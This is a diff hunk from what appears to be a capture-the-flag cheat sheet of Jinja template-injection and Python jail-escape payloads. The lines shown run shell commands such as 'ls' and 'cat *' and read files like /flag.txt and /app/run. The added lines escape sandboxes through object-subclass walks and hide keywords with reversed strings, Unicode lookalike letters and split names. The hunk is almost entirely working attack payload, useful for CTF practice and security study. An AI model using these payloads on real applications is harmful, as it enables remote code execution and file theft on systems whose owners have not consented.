@@ -16,6 +16,11 @@
 #shortcuts
  {{ url_for.__globals__.os.popen("ls").read() }}
  {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
+
+# those were for pyjails with some checks
+1 and {}.__class__.__mro__[1].__subclasses__()[203].__init__.__globals__['sys'].modules['so'[::-1]].𝓼𝔂𝓼𝓽𝓮𝓶('cat *')
+0+(a:=().__class__.__base__.__subclasses__()[151].__len__.__globals__["__b"+"uiltins__"],a["print"](a["op""en"]("/app/run").read()))
+0+().__class__.__base__.__subclasses__()[158]().__call__.__buil𝘵ins__[_:=\"__impor\\x74__\"](\"pdb\").set_trace()  # print source code
  ```
 
 ### Twig
